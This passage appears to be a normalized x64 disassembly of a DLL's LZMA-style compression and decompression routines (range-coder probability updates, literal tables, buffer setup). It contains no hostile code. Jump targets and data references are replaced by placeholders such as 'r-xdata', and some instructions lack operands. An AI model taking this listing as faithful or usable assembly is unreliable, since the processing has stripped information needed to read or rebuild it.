mov [ rbp + 0x240 ] r9
mov [ rsp + 0x44 ] r12d
mov [ rsp + 0x20 ] 0x5
mov [ rsp + 0x4c ] 0xffffffff
mov [ rsp + 0x3c ] 0xffffffffffffffff
mov [ rsp + 0x34 ] 0xffffffffffffffff
mov [ rsp + 0x2c ] 0xffffffffffffffff
mov [ rsp + 0x28 ] 0xffffffff
mov [ rsp + 0x48 ] r12d
call sub_1800016b0
mov edi 0x2
mov esi edi
mov [ rbp + 0x3076c ] 0x100
mov [ rsp + 0x60 ] rbx
nop [ rax + rax ] ax
inc edi
cmp edi 0x1a
jl r-xdata
mov ebx edx
mov r8d edx
lea rcx [ rsi + rbp + 0x3076c ]
movzx edx dil
call sub_18000bd10
add rsi rbx
mov ecx edi
mov edx 0x1
sar ecx 0x1
dec ecx
shl edx cl
test edx edx
je r-xdata
mov rdi [ rsp + 0x70 ]
mov rsi [ rsp + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov r8d 0x8
mov r9d r8d
nop [ rax ] eax
dec rcx
jne r-xdata
nop [ rax ] eax
imul eax eax
add edx edx
cmp eax 0x10000
jb r-xdata
mov rax r9
mov ecx 0xa1
add r8d 0x10
shr rax 0x4
sub ecx edx
add r9 0x10
mov [ rbp + rax * 4 + 0x3276c ] ecx
cmp r8d 0x800
jb r-xdata
shr eax 0x1
inc edx
cmp eax 0x10000
jae r-xdata
mov eax r8d
mov edx r12d
mov ecx 0x4
nop [ rax + rax ] eax
mov [ rbp + 0x33e78 ] r12
mov [ rbp + 0x3d5f8 ] r12
mov rbp [ rsp + 0x78 ]
add rsp 0x50
pop r12
retn
sub_180004980
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
add rcx 0x1c0
call sub_180008c40
lea rcx [ rbx + 0x80 ]
call sub_180008c40
mov rdx [ rbx + 0x178 ]
lea rcx [ rw-data ]
call [ rw-data ]
xor edi edi
lea rcx [ rw-data ]
mov [ rbx + 0x178 ] rdi
mov rdx [ rbx + 0x270 ]
call [ rw-data ]
mov [ rbx + 0x270 ] rdi
cmp [ rbx + 0x2ac ] edi
jne r-xdata
mov rdx [ rbx + 0x33e78 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov rdx [ rbx + 0x3d5f8 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov [ rbx + 0x33e78 ] rdi
mov [ rbx + 0x3d5f8 ] rdi
mov rdx [ rbx + 0x3d5a8 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov [ rbx + 0x3d5a8 ] rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rdx [ rbx + 0x288 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov [ rbx + 0x288 ] rdi
sub_180004a60
push rdi
sub rsp 0x70
cmp [ rcx + 0x3d5f0 ] 0x0
mov rdi rcx
je r-xdata
cmp [ rdi + 0x3d5dc ] 0x0
mov eax [ rdi + 0x3d5e4 ]
jne r-xdata
mov rcx [ rcx + 0x30 ]
call [ rdi ]
mov [ rdi + 0x3d5f0 ] 0x0
add rsp 0x70
pop rdi
retn
test eax eax
jne r-xdata
cmp [ rdi + 0x3d5c0 ] eax
mov ecx 0x9
cmovne eax ecx
cmp [ rdi + 0x2d0 ] 0x0
mov [ rdi + 0x3d5e4 ] eax
je r-xdata
mov eax [ rdi + 0x3d5e4 ]
test eax eax
je r-xdata
mov [ rdi + 0x3d5e4 ] 0x8
cmp [ rdi + 0x3d5d0 ] 0x0
mov [ rsp + 0x68 ] rbx
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x50 ] r12
mov [ rsp + 0x40 ] r14
mov r14d [ rdi + 0x3d5d0 ]
mov [ rsp + 0x90 ] r14d
mov esi r14d
mov [ rsp + 0x88 ] r14d
lea r12 [ __dos_header ]
jne r-xdata
mov [ rdi + 0x3d5dc ] 0x1
add rsp 0x70
pop rdi
retn
mov rcx [ rdi + 0x30 ]
mov [ rsp + 0x60 ] rbp
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x38 ] r15
call [ rdi + 0x10 ]
test eax eax
je r-xdata
mov rcx [ rdi + 0x30 ]
call [ rdi + 0x10 ]
mov rcx rdi
test eax eax
jne r-xdata
mov eax r14d
mov edx r14d
mov rcx rdi
sub eax esi
add [ rdi + 0x3d5d0 ] rax
call sub_1800043d0
nop [ rax ] eax
lea rdx [ rsp + 0x80 ]
call sub_1800022d0
mov edx [ rdi + 0x33218 ]
mov eax [ rdi + 0x3d580 ]
shr eax 0xb
add rdx 0x19f4
shl rdx 0x5
movzx ecx [ rdx + rdi ]
imul eax ecx
mov [ rdi + 0x3d580 ] eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdx + rdi ] ax
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov edx r14d
call sub_1800043d0
jmp r-xdata
lea r8 [ rsp + 0x80 ]
mov edx r14d
call sub_1800025a0
lea rdx [ rsp + 0x80 ]
call sub_180003d30
jmp r-xdata
mov eax [ rdi + 0x33218 ]
mov edx [ rdi + 0x33204 ]
mov rcx [ rdi + 0x30 ]
mov eax [ r12 + rax * 4 + 0x240e8 ]
neg edx
mov [ rdi + 0x33218 ] eax
call [ rdi + 0x8 ]
mov rdx [ rdi + 0x33e78 ]
lea rcx [ rdi + 0x3d580 ]
movzx r8d al
call sub_180001ab0
dec [ rdi + 0x33204 ]
inc r14d
mov [ rsp + 0x90 ] r14d
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
mov rsi [ rsp + 0x58 ]
mov r12 [ rsp + 0x50 ]
mov rbx [ rsp + 0x68 ]
mov r14 [ rsp + 0x40 ]
mov r9d [ rdi + 0x33218 ]
mov edx [ rdi + 0x3d580 ]
mov r13d ebx
add r9 0x19f4
mov ecx edx
shl r9 0x4
shr ecx 0xb
add r9 r13
movzx r8d [ rdi + r9 * 2 ]
imul ecx r8d
mov eax ecx
sub edx ecx
add [ rdi + 0x3d588 ] rax
mov eax r8d
mov [ rdi + 0x3d580 ] edx
shr eax 0x5
sub r8w ax
mov [ rdi + r9 * 2 ] r8w
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
cmp ebp 0xffffffff
jne r-xdata
mov ebx [ rdi + 0x33e74 ]
mov ebp [ rsp + 0x80 ]
mov r15d eax
and ebx r14d
mov [ rsp + 0x98 ] ebx
cmp eax 0x1
jne r-xdata
cmp ebp 0x4
jae r-xdata
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
mov edx [ rdi + 0x33218 ]
mov eax ebx
add rdx 0x19f4
shl rdx 0x4
add rdx rax
mov eax [ rdi + 0x3d580 ]
movzx ecx [ rdi + rdx * 2 ]
shr eax 0xb
imul eax ecx
mov [ rdi + 0x3d580 ] eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdi + rdx * 2 ] ax
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov edx [ rdi + 0x33218 ]
mov eax [ rdi + 0x3d580 ]
movzx ecx [ rdi + rdx * 2 + 0x34000 ]
shr eax 0xb
imul eax ecx
mov [ rdi + 0x3d580 ] eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdi + rdx * 2 + 0x34000 ] ax
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov r9d [ rdi + 0x33218 ]
mov edx [ rdi + 0x3d580 ]
movzx r8d [ rdi + r9 * 2 + 0x34000 ]
mov ecx edx
shr ecx 0xb
imul ecx r8d
mov eax ecx
sub edx ecx
add [ rdi + 0x3d588 ] rax
mov eax r8d
mov [ rdi + 0x3d580 ] edx
shr eax 0x5
sub r8w ax
mov [ rdi + r9 * 2 + 0x34000 ] r8w
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov rcx [ rdi + 0x30 ]
call [ rdi + 0x18 ]
mov ecx [ rdi + 0x33204 ]
mov r8d [ rdi + 0x33e64 ]
mov edx [ rdi + 0x33e70 ]
mov r11 rax
mov rax [ rdi + 0x33e78 ]
sub r11 rcx
and edx r14d
mov ecx 0x8
movzx r9d [ r11 - 0x1 ]
movzx r10d [ r11 ]
sub cl r8b
shr r9d cl
mov ecx r8d
movzx r8d r10b
shl edx cl
lea rcx [ rdi + 0x3d580 ]
add r9d edx
lea edx [ r9 + r9 * 2 ]
shl edx 0x8
cmp [ rdi + 0x33218 ] 0x7
lea rdx [ rax + rdx * 2 ]
jae r-xdata
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
mov eax [ rdi + 0x33218 ]
mov r9d [ rsp + 0x98 ]
xor ebx ebx
cmp [ rdi + 0x3d578 ] ebx
mov eax [ r12 + rax * 4 + 0x24118 ]
lea r14d [ r15 - 0x2 ]
lea rdx [ rdi + 0x3d580 ]
lea rcx [ rdi + 0x344e4 ]
mov r8d r14d
mov [ rdi + 0x33218 ] eax
sete bl
call sub_180001e30
test ebx ebx
je r-xdata
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
test ebp ebp
jne r-xdata
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
mov eax [ rdi + 0x33208 ]
sub r11 rax
movzx r9d [ r11 - 0x1 ]
call sub_180001b50
call sub_180001ab0
jmp r-xdata
add ebp 0xfffffffc
mov [ rsp + 0x80 ] ebp
cmp ebp 0x80
jae r-xdata
lea rbx [ rdi + r13 * 4 + 0x38cec ]
dec [ rbx ]
jne r-xdata
mov r9d [ rdi + 0x33218 ]
mov edx [ rdi + 0x3d580 ]
mov r12d [ rdi + rbp * 4 + 0x33208 ]
movzx r8d [ rdi + r9 * 2 + 0x34018 ]
mov ecx edx
shr ecx 0xb
imul ecx r8d
mov eax ecx
sub edx ecx
add [ rdi + 0x3d588 ] rax
mov eax r8d
mov [ rdi + 0x3d580 ] edx
shr eax 0x5
sub r8w ax
mov [ rdi + r9 * 2 + 0x34018 ] r8w
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov edx [ rdi + 0x33218 ]
mov eax [ rdi + 0x3d580 ]
movzx ecx [ rdi + rdx * 2 + 0x34018 ]
shr eax 0xb
imul eax ecx
mov [ rdi + 0x3d580 ] eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdi + rdx * 2 + 0x34018 ] ax
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
sub [ rdi + 0x33204 ] r15d
add r14d r15d
cmp [ rdi + 0x33204 ] 0x0
mov [ rsp + 0x90 ] r14d
jne r-xdata
mov eax [ rdi + 0x33218 ]
mov eax [ r12 + rax * 4 + 0x240e8 ]
mov [ rdi + 0x33218 ] eax
jmp r-xdata
mov ecx 0x7ffff
mov eax ebp
sub ecx ebp
shr ecx 0x1f
neg ecx
and ecx 0xc
add ecx 0x6
shr rax cl
movzx eax [ rax + rdi + 0x3076c ]
lea ebx [ rax + rcx * 2 ]
movzx ebx [ rbp + rdi + 0x3076c ]
jmp r-xdata
mov r8d [ rdi + 0x38ce8 ]
mov edx [ rsp + 0x98 ]
imul r13 r13 0x440
lea rax [ rdi + 0x3276c ]
lea rcx [ rdi + 0x344e4 ]
lea r9 [ r13 + rdi + 0x348e8 ]
mov [ rsp + 0x20 ] rax
call sub_180002040
mov r11d [ rdi + 0x38ce8 ]
mov [ rbx ] r11d
cmp ebp 0x1
jne r-xdata
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
mov eax [ rdi + 0x33218 ]
xor r8d r8d
cmp r15d 0x1
setne r8b
add rax 0x1a03
lea rcx [ rdi + 0x3d580 ]
shl rax 0x4
add rax r13
lea rdx [ rdi + rax * 2 ]
call sub_180001a50
jmp r-xdata
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
cmp [ rdi + 0x3d578 ] 0x0
mov rcx rdi
je r-xdata
cmp [ rdi + 0x3d578 ] 0x0
jne r-xdata
mov eax [ rdi + 0x33210 ]
inc [ rdi + 0x3d5d8 ]
mov r14d [ rsp + 0x90 ]
mov [ rdi + 0x33214 ] eax
mov eax [ rdi + 0x3320c ]
lea r12 [ __dos_header ]
mov [ rdi + 0x33210 ] eax
mov eax [ rdi + 0x33208 ]
mov [ rdi + 0x33208 ] ebp
mov [ rdi + 0x3320c ] eax
mov r8d ebx
mov eax ebx
mov r12d ebp
and eax 0x1
shr r8d 0x1
dec r8d
or eax 0x2
mov ecx r8d
shl eax cl
sub r12d eax
cmp ebx 0xe
jae r-xdata
mov eax 0x3
cmp r15d 0x5
lea rcx [ rdi + 0x3d580 ]
cmovb eax r14d
mov r9d ebx
mov r8d 0x6
shl rax 0x7
lea rdx [ rax + rdi + 0x341e0 ]
call sub_180001cb0
cmp ebx 0x4
jb r-xdata
mov r9d [ rdi + 0x33218 ]
mov edx [ rdi + 0x3d580 ]
movzx r8d [ rdi + r9 * 2 + 0x34030 ]
mov ecx edx
shr ecx 0xb
imul ecx r8d
mov eax ecx
sub edx ecx
add [ rdi + 0x3d588 ] rax
mov eax r8d
mov [ rdi + 0x3d580 ] edx
shr eax 0x5
sub r8w ax
mov [ rdi + r9 * 2 + 0x34030 ] r8w
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov edx [ rdi + 0x33218 ]
mov eax [ rdi + 0x3d580 ]
movzx ecx [ rdi + rdx * 2 + 0x34030 ]
shr eax 0xb
imul eax ecx
mov [ rdi + 0x3d580 ] eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rdi + rdx * 2 + 0x34030 ] ax
mov eax [ rdi + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
cmp r15d 0x1
jne r-xdata
mov rcx [ rdi + 0x30 ]
call [ rdi + 0x10 ]
test eax eax
je r-xdata
cmp [ rdi + 0x3d5d8 ] 0x80
jb r-xdata
mov edx r12d
lea rcx [ rdi + 0x3d580 ]
add r8d 0xfffffffc
shr edx 0x4
call sub_180001950
and r12d 0xf
lea rdx [ rdi + 0x344c4 ]
lea rcx [ rdi + 0x3d580 ]
mov r9d r12d
mov r8d 0x4
call sub_180001d70
inc [ rdi + 0x33e5c ]
mov ecx eax
mov eax ebx
mov r9d r12d
sub rcx rax
lea rdx [ rdi + rcx * 2 + 0x343de ]
lea rcx [ rdi + 0x3d580 ]
call sub_180001d70
jmp r-xdata
mov eax [ rdi + 0x33218 ]
lea r8d [ rbp - 0x2 ]
lea rcx [ rdi + 0x3d580 ]
lea rdx [ rdi + rax * 2 + 0x34048 ]
call sub_180001a50
cmp ebp 0x3
jne r-xdata
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
mov eax [ rdi + 0x33208 ]
mov [ rdi + 0x33208 ] r12d
lea r12 [ __dos_header ]
mov [ rdi + 0x3320c ] eax
shl eax 0x8
lea rcx [ rdi + 0x3d580 ]
mov [ rdi + 0x3d580 ] eax
call sub_1800017d0
jmp r-xdata
xor r10d r10d
lea rax [ rdi + 0x3276c ]
lea r8d [ r15 - 0x2 ]
cmp [ rdi + 0x3d578 ] r10d
mov [ rsp + 0x28 ] rax
lea rcx [ rdi + 0x38d2c ]
sete r10b
lea rdx [ rdi + 0x3d580 ]
mov r9d ebx
mov [ rsp + 0x20 ] r10d
call sub_180002250
mov r11d [ rdi + 0x33218 ]
mov eax [ r12 + r11 * 4 + 0x24148 ]
mov [ rdi + 0x33218 ] eax
jmp r-xdata
mov eax [ rdi + 0x33218 ]
mov eax [ r12 + rax * 4 + 0x24178 ]
mov [ rdi + 0x33218 ] eax
jmp r-xdata
mov eax r14d
sub eax esi
cmp eax 0x8000
jb r-xdata
cmp [ rdi + 0x33e5c ] 0x10
jb r-xdata
mov rcx rdi
call sub_180004550
mov eax [ rdi + 0x3320c ]
mov [ rdi + 0x33210 ] eax
mov eax [ rdi + 0x33210 ]
mov [ rdi + 0x33214 ] eax
mov esi [ rsp + 0x88 ]
sub r14d esi
mov rcx rdi
mov eax r14d
add [ rdi + 0x3d5d0 ] rax
call sub_180004380
jmp r-xdata
mov rcx rdi
call sub_1800044c0
mov rbp [ rsp + 0x60 ]
mov r13 [ rsp + 0x48 ]
mov r15 [ rsp + 0x38 ]
sub_1800053b0
push rdi
sub rsp 0x30
cmp [ rcx + 0x3d5a8 ] 0x0
mov rdi rcx
jne r-xdata
mov [ rsp + 0x48 ] rbp
mov [ rsp + 0x50 ] rsi
xor esi esi
cmp [ rdi + 0x3d5e0 ] esi
je r-xdata
lea rcx [ rw-data ]
mov edx 0x10000
call [ rw-data ]
mov [ rdi + 0x3d5a8 ] rax
test rax rax
je r-xdata
mov eax esi
cmp [ rdi + 0x3d578 ] esi
jne r-xdata
mov eax 0x2
add rsp 0x30
pop rdi
retn
add rax 0x10000
mov [ rdi + 0x3d5a0 ] rax
lea rcx [ rw-data ]
call [ rw-data ]
mov rdx [ rdi + 0x3d5f8 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov ecx ebp
mov eax 0x300
shl eax cl
lea rcx [ rw-data ]
mov [ rdi + 0x33e78 ] rsi
movsxd rbx eax
mov [ rdi + 0x3d5f8 ] rsi
add rbx rbx
mov rdx rbx
call [ rw-data ]
lea rcx [ rw-data ]
mov rdx rbx
mov [ rdi + 0x33e78 ] rax
call [ rw-data ]
mov rdx [ rdi + 0x33e78 ]
mov [ rdi + 0x3d5f8 ] rax
test rdx rdx
je r-xdata
cmp [ rdi + 0x3d5f8 ] rsi
je r-xdata
lea eax [ rsi + 0x1 ]
cmp [ rdi + 0x2b8 ] esi
jne r-xdata
lea rcx [ rw-data ]
call [ rw-data ]
mov rdx [ rdi + 0x3d5f8 ]
lea rcx [ rw-data ]
call [ rw-data ]
mov [ rdi + 0x33e78 ] rsi
mov [ rdi + 0x3d5f8 ] rsi
test rax rax
je r-xdata
cmp [ rdi + 0x3d574 ] ebp
je r-xdata
mov ebp [ rdi + 0x33e68 ]
mov rdx [ rdi + 0x33e78 ]
mov [ rsp + 0x40 ] rbx
add ebp [ rdi + 0x33e64 ]
mov [ rdi + 0x38 ] eax
test rdx rdx
je r-xdata
mov [ rdi + 0x3d574 ] ebp
mov edx [ rdi + 0x3d5e8 ]
mov r9d [ rdi + 0x33200 ]
mov r8d 0x1000
cmp edx 0x1000000
seta sil
cmp [ rdi + 0x38 ] 0x0
mov [ rdi + 0x2bc ] esi
je r-xdata
lea rbx [ rdi + 0x248 ]
mov [ rsp + 0x20 ] 0x111
mov rcx rbx
call sub_180007830
test eax eax
je r-xdata
lea rbx [ rdi + 0x40 ]
mov rcx rbx
call sub_180009780
test eax eax
jne r-xdata
mov eax 0x2
mov rdx rdi
mov rcx rbx
mov [ rdi + 0x30 ] rbx
call sub_180008a20
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rdx rdi
mov rcx rbx
mov [ rdi + 0x30 ] rbx
call sub_180009fd0
xor eax eax
jmp r-xdata
sub_1800055b0
mov [ rsp + 0x8 ] rdi
xor r11d r11d
mov r9d 0x1
mov r8 rcx
mov [ rcx + 0x33218 ] r11d
mov [ rcx + 0x33208 ] r11
mov [ rcx + 0x33210 ] r11
mov rax [ rcx + 0x3d5a8 ]
mov [ rcx + 0x3d588 ] r11
mov [ rcx + 0x3d580 ] 0xffffffff
mov [ rcx + 0x3d598 ] rax
mov [ rcx + 0x3d590 ] r9
mov [ rcx + 0x3d584 ] r11b
lea rax [ rcx + 0x34060 ]
mov [ rcx + 0x3d5b8 ] r11
mov [ rcx + 0x3d5c0 ] r11d
lea rdx [ rcx + 0x34018 ]
lea edi [ r11 + 0xc ]
mov r10d 0x400
nop [ rax ] eax
mov [ rax - 0x1e0 ] r10w
mov [ rax ] r10w
add rax 0x2
dec rcx
jne r-xdata
mov [ rdx - 0x18 ] r10w
mov [ rdx ] r10w
mov [ rdx + 0x18 ] r10w
mov [ rdx + 0x30 ] r10w
add rdx 0x2
dec rdi
jne r-xdata
mov ecx 0x10
nop [ rax + rax ] ax
mov ecx [ r8 + 0x33e64 ]
mov edx 0x300
add ecx [ r8 + 0x33e68 ]
shl edx cl
test edx edx
je r-xdata
movzx eax r10w
lea rdi [ r8 + 0x341e0 ]
mov ecx 0x100
[ rdi ]
movzx eax r10w
lea rdi [ r8 + 0x343e0 ]
mov ecx 0x72
[ rdi ]
mov [ r8 + 0x344e4 ] 0x4000400
movzx eax r10w
lea rdi [ r8 + 0x344e8 ]
mov ecx 0x80
[ rdi ]
movzx eax r10w
lea rdi [ r8 + 0x345e8 ]
mov ecx 0x80
[ rdi ]
movzx eax r10w
lea rdi [ r8 + 0x346e8 ]
mov ecx 0x100
[ rdi ]
mov [ r8 + 0x38d2c ] 0x4000400
movzx eax r10w
lea rdi [ r8 + 0x38d30 ]
mov ecx 0x80
[ rdi ]
movzx eax r10w
lea rdi [ r8 + 0x38e30 ]
mov ecx 0x80
[ rdi ]
movzx eax r10w
lea rdi [ r8 + 0x38f30 ]
mov ecx 0x100
[ rdi ]
movzx eax r10w
lea rdi [ r8 + 0x344c4 ]
mov ecx 0x10
[ rdi ]
mov ecx [ r8 + 0x33e6c ]
mov rdi [ rsp + 0x8 ]
mov eax r9d
mov [ r8 + 0x758 ] r11
mov [ r8 + 0x33204 ] r11d
shl eax cl
mov ecx [ r8 + 0x33e68 ]
shl r9d cl
dec eax
dec r9d
mov [ r8 + 0x33e74 ] eax
mov [ r8 + 0x33e70 ] r9d
retn
mov rcx r11
nop [ rax ] eax
mov rax [ r8 + 0x33e78 ]
add rcx 0x2
dec rdx
mov [ rcx + rax - 0x2 ] r10w
jne r-xdata
sub_1800057b0
push rbx
push r13
push r15
sub rsp 0x40
mov rbx rcx
xor r15d r15d
mov r13d 0x1
mov edx [ rbx + 0x3d5e8 ]
mov ecx r15d
mov eax r13d
lea eax [ rcx + rcx ]
mov rcx rbx
mov [ rbx + 0x3d5dc ] r15d
mov [ rbx + 0x33e60 ] eax
mov [ rbx + 0x3d5e4 ] r15d
call sub_1800053b0
test eax eax
jne r-xdata
inc ecx
rol eax 0x1
cmp ecx 0x1f
jb r-xdata
add rsp 0x40
pop r15
pop r13
pop rbx
retn
mov [ rsp + 0x60 ] rbp
mov rcx rbx
mov [ rsp + 0x68 ] rsi
mov [ rsp + 0x70 ] rdi
call sub_1800055b0
cmp [ rbx + 0x3d578 ] r15d
jne r-xdata
cmp edx eax
jbe r-xdata
mov ecx [ rbx + 0x33e6c ]
mov eax [ rbx + 0x33200 ]
mov esi r13d
dec eax
shl esi cl
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r14
mov [ rbx + 0x3d530 ] eax
mov [ rbx + 0x38ce8 ] eax
mov ebp r15d
test esi esi
je r-xdata
mov rcx rbx
call sub_180004550
mov rcx rbx
call sub_1800044c0
mov ecx [ rbx + 0x33e6c ]
mov esi r15d
shl r13d cl
test r13d r13d
je r-xdata
lea r15 [ rbx + 0x3276c ]
lea r12 [ rbx + 0x38cec ]
lea r14 [ rbx + 0x348e8 ]
nop [ rax + rax ] eax
mov r14 [ rsp + 0x30 ]
mov r12 [ rsp + 0x38 ]
mov rdi [ rsp + 0x70 ]
mov rsi [ rsp + 0x68 ]
mov rbp [ rsp + 0x60 ]
mov [ rbx + 0x3d5d0 ] r15
xor eax eax
lea r14 [ rbx + 0x3276c ]
lea rbp [ rbx + 0x3d534 ]
lea r12 [ rbx + 0x39130 ]
mov r8d [ rbx + 0x38ce8 ]
lea rcx [ rbx + 0x344e4 ]
mov r9 r14
mov edx ebp
mov [ rsp + 0x20 ] r15
call sub_180002040
mov r11d [ rbx + 0x38ce8 ]
inc ebp
mov [ r12 ] r11d
add r12 0x4
add r14 0x440
cmp ebp esi
jb r-xdata
xor r15d r15d
mov r8d [ rbx + 0x3d530 ]
lea rcx [ rbx + 0x38d2c ]
mov r9 r12
mov edx esi
mov [ rsp + 0x20 ] r14
call sub_180002040
mov r11d [ rbx + 0x3d530 ]
inc esi
mov [ rbp ] r11d
add rbp 0x4
add r12 0x440
cmp esi r13d
jb r-xdata
sub_180005950
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx + 0x10 ]
mov rdi r8
mov rbx rcx
cmp rax r8
jae r-xdata
mov rax [ rw-data ]
test rax rax
je r-xdata
mov rdi rax
mov [ rcx + 0x18 ] 0x1
sub [ rbx + 0x10 ] rdi
add [ rbx + 0x8 ] rdi
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
mov rcx [ rcx + 0x8 ]
mov r8 rdi
call rax
sub_1800059a0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x330
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x320 ] rax
mov rbx rcx
xor eax eax
lea rdx [ rsp + 0x20 ]
nop [ rax ] eax
inc eax
inc rdx
cmp eax 0x10
jl r-xdata
call sub_180004a60
mov edi eax
test eax eax
jne r-xdata
cmp [ rbx + 0x38 ] 0x0
je r-xdata
cmp [ rbx + 0x3d5dc ] 0x0
jne r-xdata
mov eax edi
mov rcx [ rsp + 0x320 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x348 ]
add rsp 0x330
pop rdi
retn
lea rcx [ rbx + 0x80 ]
call sub_180008b80
mov rcx rbx
call sub_180004a60
mov edi eax
test eax eax
je r-xdata
sub_180005a40
cmp [ rw-data ] 0x5
mov edx [ rcx + 0x3d5e8 ]
mov r8 rcx
jae r-xdata
mov [ rw-data ] 0x5
movzx ecx [ rcx + 0x33e6c ]
movzx eax cl
shl al 0x2
add cl al
add cl [ r8 + 0x33e68 ]
movzx eax cl
shl al 0x3
add cl al
add cl [ r8 + 0x33e64 ]
mov [ rw-data ] cl
mov ecx 0xb
mov eax 0x5
retn
mov edx 0x2
mov eax 0x3
shl eax cl
cmp edx eax
jbe r-xdata
mov edx 0x3
jmp r-xdata
inc ecx
cmp ecx 0x1e
jle r-xdata
shl edx cl
mov eax 0x2
shl eax cl
cmp edx eax
jbe r-xdata
jmp r-xdata
mov eax edx
mov [ rw-data ] dl
shr eax 0x8
mov [ rw-data ] al
mov eax edx
shr edx 0x18
shr eax 0x10
mov [ rw-data ] dl
mov [ rw-data ] al
xor eax eax
retn
sub_180005af0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
lea rax [ sub_180005950 ]
mov rbx r8
mov rsi rdx
mov [ rsp + 0x20 ] rax
mov rax [ r8 ]
mov rdi rcx
mov [ rsp + 0x30 ] rax
xor eax eax
mov [ rsp + 0x28 ] rdx
mov [ rsp + 0x38 ] eax
mov [ rcx + 0x3d5c8 ] eax
lea rax [ rsp + 0x20 ]
mov [ rcx + 0x3d5b0 ] rax
mov rax [ rsp + 0x70 ]
mov [ rcx + 0x2ac ] 0x1
mov [ rcx + 0x288 ] r9
mov [ rcx + 0x3d5f0 ] 0x1
mov [ rcx + 0x2b0 ] rax
call sub_1800057b0
mov r11d eax
test eax eax
jne r-xdata
test rsi rsi
jne r-xdata
mov rcx rdi
call sub_1800059a0
mov r11d eax
mov rax [ rsp + 0x30 ]
sub [ rbx ] rax
mov eax [ rdi + 0x3d5b8 ]
mov [ rbx ] rax
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov eax 0x7
cmovne r11d eax
mov eax r11d
add rsp 0x40
pop rdi
retn
sub_180005bb0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x48
mov eax [ rcx + 0x4c ]
mov edi [ rcx + 0x58 ]
mov r13 [ rcx + 0x10 ]
mov r15d [ rcx + 0x48 ]
mov rdx rcx
mov [ rsp ] eax
mov eax [ rcx + 0x50 ]
mov rsi [ rdx + 0x18 ]
mov r10d [ rdx + 0x40 ]
mov r14 [ rdx + 0x30 ]
mov rbp [ rdx + 0x20 ]
mov r9d [ rdx + 0x28 ]
mov r8d [ rdx + 0x2c ]
mov [ rsp + 0x4 ] eax
mov eax [ rcx + 0x54 ]
mov ecx [ rcx + 0x8 ]
mov [ rsp + 0x8 ] eax
mov eax 0x1
mov r11d 0x1
mov [ rsp + 0xc ] edi
mov [ rsp + 0x30 ] rsi
shl r11d cl
mov ecx [ rdx + 0x4 ]
mov [ rsp + 0xa8 ] r10d
shl eax cl
dec r11d
dec eax
mov [ rsp + 0x20 ] r11d
mov [ rsp + 0x24 ] eax
mov eax [ rdx ]
mov [ rsp + 0x28 ] eax
mov rax [ rdx + 0x38 ]
mov [ rsp + 0x18 ] rax
mov eax [ rdx + 0x44 ]
mov [ rsp + 0x10 ] eax
xor eax eax
mov r12d eax
nop [ rax ] eax
mov eax r9d
shr eax 0xb
imul eax ecx
cmp r8d eax
jae r-xdata
movzx eax [ rbp ]
shl r8d 0x8
shl r9d 0x8
or r8d eax
inc rbp
sub r9d eax
sub r8d eax
mov eax ecx
shr eax 0x5
mov r10d r15d
sub cx ax
mov [ r13 + r11 * 2 ] cx
movzx ecx [ r13 + r10 * 2 + 0x180 ]
